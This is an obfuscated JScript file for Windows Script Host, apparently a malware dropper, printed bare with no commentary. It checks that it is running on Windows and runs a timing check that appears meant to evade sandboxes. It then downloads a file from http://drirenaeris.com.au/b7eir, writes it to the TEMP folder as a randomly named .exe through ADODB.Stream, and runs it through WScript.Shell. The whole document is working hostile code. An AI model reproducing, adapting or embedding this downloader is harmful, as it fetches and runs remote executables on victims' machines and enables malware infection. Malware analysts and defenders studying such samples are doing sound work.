var KA = false;
var D = "Create"+"Object";
var E0 = function VW() {return WScript[D]("WScript"+".Shell");}(), O = 11;
var I1 = "MSXML2"+".XMLHTTP";
var PG = 2;
var RA = PG - 2;
function ON(IL){E0["Run"](IL, RA, RA);};
function OE(){return I1 + "";};
function FF(IG, RM){RA = RA * 1; return IG - RM;};
function S(){return D;};
/*@cc_on
  @if (@_win32 || @_win64)
    KA = true;
  @end
@*/
if (KA)
{
var G = "";
function FL(){return 22;};
var SI = 0; var E = 0;
function US()
{
var H = new this["Date"]();
var I0 = H["getUTCMilliseconds"]();
WScript["Sleep"](FL());
var H = new this["Date"]();
var BK = H["getUTCMilliseconds"]();
WScript["Sleep"](FL());
var H = new this["Date"]();
var I = H["getUTCMilliseconds"]();
var SI = "M0";
SI = FF(BK, I0);
var E = "GI";
E = FF(I, BK);
G = "open";
return FF(SI, E);
}
var UN = false;
var C = false;
for (var DO = RA; DO < FL() * 1; DO++){if (US() != RA){
UN = true; 
E = "31" + 11 * SI + E; 
C = true; 
break;
}}
function QJ() {return ((UN == true) && (UN == C)) ? 1 : RA;};
if (UN && QJ() && C){
function GO() {return E0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "GZ0D5zAYRT8w7HQI.ex" + "e";};
 O0 = OE();
 EQ = WScript[D](O0);
 var F = 1;
do { 
	for (;F;){
	try {
		if (F == 1)
		{
			EQ[G]("GET", "http://drirenaeris.com.au/b7eir", false);
			EQ["send"]();
			D0 = "Sleep";
			F = 2;
		}
		WScript[D0](FL() + 120); 
		if (EQ["readystate"] < 2 * 2) continue;
		F = RA;
		function M(GO0) {var A = (1, 2, 3, 4, 5, GO0); return A;};
		G0 = WScript[S()]("ADODB.Stream");
		O0 = G0;
		O0[G]();
		O0["type"] = M(1);
		O0["write"](EQ["ResponseBody"]);
		G0["position"] = M(RA);
		O0["Save" + "ToFile"](GO(), 2);
		G0["cl"+"ose"]();
		L = GO();
		ON(L);
	} catch(Z){};};
}while (F);
}
}

